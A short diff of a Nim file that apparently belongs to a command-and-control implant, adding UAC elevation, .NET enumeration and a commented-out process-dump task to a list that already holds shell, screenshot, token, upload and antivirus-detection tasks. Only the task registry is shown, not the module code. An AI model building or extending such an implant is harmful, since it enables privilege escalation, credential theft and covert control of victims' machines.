@@ -1,6 +1,8 @@
 import net
 
-import download, msgbox, processes, screenshot, shell, tokinfo, upload, antiviruses
+import  download, msgbox, processes, screenshot, 
+        shell, tokinfo, upload, antiviruses, uac_elv,
+        dotnet_info, dumpprocess
 
 var tasks*: seq[tuple[
   name: string, 
@@ -15,3 +17,6 @@ tasks.add((name: "shell", execute: shell.executeTask))
 tasks.add((name: "tokinfo", execute: tokinfo.executeTask))
 tasks.add((name: "upload", execute: upload.executeTask))
 tasks.add((name: "antiviruses", execute: antiviruses.executeTask))
+tasks.add((name: "uac_elv", execute: uac_elv.executeTask))
+tasks.add((name: "dotnet_info", execute: dotnet_info.executeTask))
+# tasks.add((name: "dumpprocess", execute: dumpprocess.executeTask))
